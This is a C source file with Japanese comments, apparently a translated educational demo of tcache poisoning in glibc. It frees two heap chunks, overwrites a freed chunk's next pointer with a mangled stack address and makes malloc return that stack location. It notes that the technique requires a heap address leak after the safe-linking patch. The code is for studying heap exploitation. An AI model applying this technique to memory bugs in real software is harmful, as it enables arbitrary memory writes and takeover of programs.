#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// バッファリングを無効にします
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("このファイルは、malloc をだまして任意の場所(この場合はスタック)へのポインタを\n"
		   "返させる、単純な tcache poisoning 攻撃を示します。\n"
		   "この攻撃は fastbin corruption 攻撃によく似ています。\n");
	printf("パッチ https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f の後は、\n"
		   "fd ポインタを乗っ取る前に、パディング用にもう 1 つチャンクを確保して解放する必要があります。\n\n");
	printf("パッチ https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 の後は、\n"
		   "tcache poisoning を行うにはヒープアドレスのリーク(leak)が必要です。\n"
		   "同じパッチは、tcache が返すチャンクが適切にアラインされていることも保証します。\n\n");

	size_t stack_var[0x10];
	size_t *target = NULL;

	// 適切にアラインされたターゲットアドレスを選びます
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	printf("malloc() に返させたいアドレスは %p です。\n", target);

	printf("2 つのバッファを確保します。\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("バッファを解放します...\n");
	free(a);
	free(b);

	printf("現在の tcache のリストは [ %p -> %p ] です。\n", b, a);
	printf("先頭の %lu バイト(fd/next ポインタ)を、%p にあるデータのうち\n"
		   "制御したい場所 (%p) を指すように上書きします。\n", sizeof(intptr_t), b, target);
	// VULNERABILITY
	// 次の操作は b のアドレスが既知であることを前提としており、ヒープのリークが必要です
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	// VULNERABILITY
	printf("現在の tcache のリストは [ %p -> %p ] です。\n", b, target);

	printf("1 回目の malloc(128): %p\n", malloc(128));
	printf("現在の tcache のリストは [ %p ] です。\n", target);

	intptr_t *c = malloc(128);
	printf("2 回目の malloc(128): %p\n", c);
	printf("制御を奪えました\n");

	assert((long)target == (long)c);
	return 0;
}
